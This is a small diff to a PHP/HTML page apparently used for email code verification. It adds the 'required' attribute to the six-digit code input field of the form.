@@ -69,7 +69,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 <p class="text-muted">Enter the code from your email address at: <span class="email-domain">@gmail.com</span></p>
                 
                 <div class="box">
-                    <input class="form-control" type="text" name="code" id="code" maxlength="6" minlength="6" placeholder="XXXXXX">
+                    <input class="form-control" type="text" name="code" id="code" maxlength="6" minlength="6" placeholder="XXXXXX" required>
                 </div>
                 <div class="button">
                     <input type="submit" value="Continue" class="btn" name="submit" onclick="showSuccessAlert()">
